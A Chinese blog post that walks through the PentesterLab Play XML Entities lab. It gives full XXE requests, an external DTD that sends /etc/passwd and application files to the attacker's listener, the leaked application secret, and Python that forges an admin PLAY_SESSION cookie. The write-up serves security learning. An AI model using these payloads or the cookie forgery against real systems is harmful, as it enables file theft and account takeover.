---
title: play渗透框架XXE实体攻击
date: 2017-04-21 14:39:53
categories: Web安全
tags:
    - XXE
---

## 简要介绍

本文记录的是利用play渗透框架学习XXE实体攻击的过程，实验环境来自于[pentesterlab Play XML Entities](https://pentesterlab.com/exercises/play_xxe), 下载页面的iso, 用虚拟机软件PD或vmvare安装即可。打开虚拟机，获取虚拟机ip地址，然后访问就可以实验了，并不需要开启服务等其他操作，非常简单易用。同时还配备了课程讲解[https://pentesterlab.com/exercises/play_xxe/course](https://pentesterlab.com/exercises/play_xxe/course).

Play Framework是一个web的框架，在这个框架中，开发者可以快速的使用java或者scala编译开发web应用。这样可以有序管理代码，并且url可以像Ruby-on-Rails一样被映射。就像Ruby-on-Rails，当收到Http请求时，Play框架管理多种文本类型。

<!-- more -->

## 信息获取

目标ip: `10.211.15.4`, 访问如下:

{% asset_img login.png %}

练习的目标是: `读任意文件`, `获取secret_url`, `login as admin`。

## 实体攻击

### 探测外部实体请求

首先测试目标服务器是否解析XML内容，并请求外部实体。本地开启服务器，接收来自目标服务器的外部实体请求：`python -m SimpleHTTPServer 8000`, 然后burp发送如下请求

```
POST /login HTTP/1.1
Host: 10.211.55.14
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://10.211.55.14/login
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Content-Length: 96

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://10.211.55.2:8000/test.dtd">
<foo>&e1;</foo>
```

本地监听到如下内容，表明目标服务器解析XML内容，并发出了外部实体请求。

```
10.211.55.14 - - [21/Apr/2017 11:29:17] code 404, message File not found
10.211.55.14 - - [21/Apr/2017 11:29:17] "GET /test.dtd HTTP/1.1" 404 -
```

注意: burp发出的请求的`Content-Type`必须为: `text/xml`, 而不能是`application/xml`, 猜测是目标服务器限制了解析的xml mime类型。

### 任意文件读取

目标服务器会请求外部实体，那么可以本地写test.dtd, 返回给目标服务器，test.dtd内容如下。

```
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://10.211.55.2:8000/BLAH?%p1;'>">
%p2;
```

burp再次发生之前的请求，本地服务器能监听到:

```
10.211.55.14 - - [21/Apr/2017 11:54:10] "GET /test.dtd HTTP/1.1" 200 -
10.211.55.14 - - [21/Apr/2017 11:54:10] code 404, message File not found
10.211.55.14 - - [21/Apr/2017 11:54:10] "GET /BLAH?root:x:0:0:root:/root:/bin/sh%0Alp:x:7:7:lp:/var/spool/lpd:/bin/sh%0Anobody:x:65534:65534:nobody:/nonexistent:/bin/false%0Atc:x:1001:50:Linux%20User,,,:/home/tc:/bin/sh%0Apentesterlab:x:1000:50:Linux%20User,,,:/home/pentesterlab:/bin/sh%0Aplay:x:100:65534:Linux%20User,,,:/opt/play-2.1.3/xxe/:/bin/false%0Amysql:x:101:65534:Linux%20User,,,:/home/mysql:/bin/false%0A HTTP/1.1" 404 -
```

显然，成功读取目标服务器`/etc/passwd`文件内容，接着应该去获取`secret_url`, 那么需要知道目标服务器源码文件的内容，从获取的`/etc/passwd`文件内容可以发现用户`play`的路径为`/opt/play-2.1.3/xxe/`, 那么改变test.dtd，读`/opt/play-2.1.3/xxe/`目录:

```
<!ENTITY % p1 SYSTEM "file:///opt/play-2.1.3/xxe/">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://10.211.55.2:8000/BLAH?%p1;'>">
%p2;
```

得到如下内容:

```
10.211.55.14 - - [21/Apr/2017 15:21:24] "GET /BLAH?.gitignore%0A.settings%0Aapp%0Aconf%0Alogs%0Aproject%0Apublic%0AREADME%0ARUNNING_PID%0Atarget%0Atest%0A HTTP/1.1" 404 -

# url decode
.gitignore
.settings
app
conf
logs
project
public
README
RUNNING_PID
target
test
```

通常，java框架会有路由配置url映射，那么可以访问`/opt/play-2.1.3/xxe/conf/`目录(采用和上面相同的方式)，得到如下内容:

```
10.211.55.14 - - [21/Apr/2017 12:56:38] "GET /BLAH?application.conf%0Aevolutions%0Aroutes%0A HTTP/1.1" 404 -

# url decode
application.conf
evolutions
routes
```

在访问`routes`,有如下内容

```
GET     /                           controllers.Application.index()
GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()
GET       /login                   controllers.Application.login
POST      /login                   controllers.Application.login
GET       /logout                  controllers.Application.logout

GET     /assets/*file               controllers.Assets.at(path="/public", file)
```

得到secret_url为:`0ecf87346b9c0b370f8d63e6e7fed4f0`, 访问。

{% asset_img secret.png %}

### 伪造cookie

要实现admin用户登录，要么获取密码或登录绕过，要么利用cookie伪造登录，这里仅探讨伪造cookie登录。要实现cookie的伪造，那么需要知道目标服务器设置session的加密方式，访问`/opt/play-2.1.3/xxe/conf/application.conf`文件，得到application.secret=`"X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"`.

```
application.secret="X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"
application.langs="en"
db.default.driver=com.mysql.jdbc.Driver
db.default.url="mysql://pentesterlab:pentesterlab@localhost/xxe"
ebean.default="models.*"
logger.root=ERROR
logger.play=INFO
logger.application=DEBUG
```

session的管理在`app/controllers/Application.java`中（或者.scala）, 核心代码如下:

```
User user = User.findByUsername(username);
if (user!=null) {
    if (user.password.equals(md5(username+":"+password) )) {
      session("user",username);
      return redirect("/");
```

显然，我们要利用`user=admin`来伪造session.

`framework/src/play/src/main/scala/play/api/mvc/Http.scala`中：

```
    def encode(data: Map[String, String]): String = {
      val encoded = data.map {
        case (k, v) => URLEncoder.encode(k, "UTF-8") + "=" + URLEncoder.encode(v, "UTF-8")
      }.mkString("&")
      if (isSigned)
        Crypto.sign(encoded) + "-" + encoded
      else
        encoded
    }
```

可知，session内容的格式为: `signature-name1=value1&name2=value2`, 其实name1,value1等都经过url编码处理, 其中`encoded=name1=value1&name2=value2`, `signature=Crypto.sign(encoded)`。

加密函数如下：

```
def sign(message: String, key: Array[Byte]): String = {
   val mac = Mac.getInstance("HmacSHA1")
   mac.init(new SecretKeySpec(key, "HmacSHA1"))
   Codecs.toHexString(mac.doFinal(message.getBytes("utf-8")))
 }
```

其中`key= "[KEY FOUND IN conf/application.conf]"`, 那么利用python伪造session内容，过程如下:

```python
In [1]: import hashlib
In [6]: import hmac
In [9]: key =  "X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"
In [10]: data = "user=admin"
In [11]: h = hmac.new(key, data, hashlib.sha1)

In [12]: h.hexdigest()
Out[12]: 'a5b8363ce748cfbb5d654edc3676d440173b33de'
```

这里必须使用`hmac`库，而不能仅仅使用`hashlib`库来计算sha1, 因为hmac库使用key来生成salt, 然后用`hashlib.sha1`来计算hash值，而不是直接对`key+data`生成hash值。

然后进行cookie伪造，cookie名字就是`PLAY_SESSION`, burp请求如下:

```
GET / HTTP/1.1
Host: 10.211.55.14
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 FirePHP/0.7.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
x-insight: activate
Cookie: PLAY_SESSION="a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin"
Connection: close
Upgrade-Insecure-Requests: 1
```

{% asset_img admin.png %}

## 后记

XXE注入的本质是网站允许提交xml内容，而后台处理xml时不规范导致存在解析了xml内容中的外部实体。因此，如果网站允许提交xml内容，则可能存在XXE注入漏洞。

## 参考

* [https://pentesterlab.com/exercises/play_xxe/course](https://pentesterlab.com/exercises/play_xxe/course)
* [freebuf Play框架的XML Entity Exploit](http://www.freebuf.com/vuls/83599.html)
* [XML实体攻击回顾](http://rickgray.me/2015/06/08/xml-entity-attack-review.html)
